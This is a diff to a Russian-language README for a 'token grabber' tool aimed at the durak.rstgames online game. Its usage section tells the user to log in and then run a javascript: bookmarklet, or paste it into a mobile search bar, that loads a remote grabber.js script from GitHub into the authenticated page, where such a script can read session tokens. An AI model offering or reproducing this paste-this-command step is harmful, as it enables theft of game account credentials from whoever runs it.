@@ -6,8 +6,7 @@ Durak Online Token Grabber - это инструмент, для получен�
 
 ## Как использовать
 1. Войдите в нужный аккаунт на сайте https://durak.rstgames.co
-2. Сохраните [закладку](javascript:var%20g%3Ddocument.createElement(%22script%22)%3Bg.src%3D%22https%3A%2F%2Fraw.githubusercontent.com%2Foulol%2FDOTG%2Frefs%2Fheads%2Fmain%2Fgrabber.js%22%3Bdocument.body.appendChild(g))
-Или если вы на телефоне, ввести данный текст в поле поиска
+2. Сохраните URL ниже в закладку (если вы на ПК) или введите в строку поиска если вы на мобильном устройстве
 ```
 javascript:var g=document.createElement("script");g.src="https://raw.githubusercontent.com/oulol/DOTG/refs/heads/main/grabber.js";document.body.appendChild(g)
 ```
